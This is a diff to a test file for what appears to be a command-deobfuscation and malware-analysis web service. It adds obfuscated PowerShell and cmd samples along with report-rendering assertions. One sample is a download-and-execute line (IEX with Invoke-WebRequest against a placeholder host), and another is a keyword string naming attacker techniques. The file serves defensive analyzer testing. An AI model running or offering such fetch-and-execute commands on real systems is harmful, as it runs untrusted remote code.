@@ -29,6 +29,12 @@ try {
  const b64=s=>Buffer.from(s).toString('base64');
  const script='Write-Output "https://example.com/harmless.txt"';
  const samples=[
+   "Write-Output (-join [char[]](104,101,108,108,111))",
+   "$a='he'; $b='llo'; Write-Output ($a+$b)",
+   "Write-Output (-join (111,98,107,107,104 | ForEach-Object {[char]($_ -bxor 7)}))",
+   'cmd /v:on /c "set x=hello&&echo !x!"',
+   "IEX (Invoke-WebRequest 'https://example.invalid/hello.ps1')",
+   "Write-Output 'IEX DownloadString VirtualAlloc schtasks'",
    b64(gzipSync(Buffer.from(b64(Buffer.from(script,'utf16le'))))),
    b64(deflateSync(Buffer.from(script))),
    "('Write-' + ('Out' + 'put'))",
@@ -70,11 +76,15 @@ try {
    const cells=await result.locator('td').allTextContents();
    for(const i of report.iocs) for(const v of [i.type,i.value,i.evidence_id]) assert.ok(cells.includes(v),'IOC '+v);
    for(const w of report.unresolved_portions) assert.ok(rendered.includes(w),'unresolved '+w);
-   for(const b of report.behaviors) assert.ok(rendered.includes(b.explanation));
+   for(const b of report.behaviors) {
+     assert.ok(rendered.includes(b.explanation));
+     assert.ok(rendered.includes(b.kind.replaceAll('_',' ')));
+     assert.ok(rendered.includes(`characters ${b.start}–${b.end}`));
+   }
    assert.equal(await result.locator('img,script').count(),0,'evidence is inert escaped text');
    assert.ok(await page.evaluate(()=>document.documentElement.scrollWidth <= window.innerWidth));
  }
- console.log('PASS: 11 additional HTTP/browser cases; all layers, recipes, candidates, IOCs, limitations, inert text and mobile width');
+ console.log('PASS: 17 additional HTTP/browser cases; all layers, recipes, candidates, IOCs, limitations, inert text and mobile width');
  // Late response must not reappear after tenant change.
  let release; const gate=new Promise(resolve=>release=resolve);
  await page.route('**/api/analyze/command',async route=>{await gate;await route.continue();});
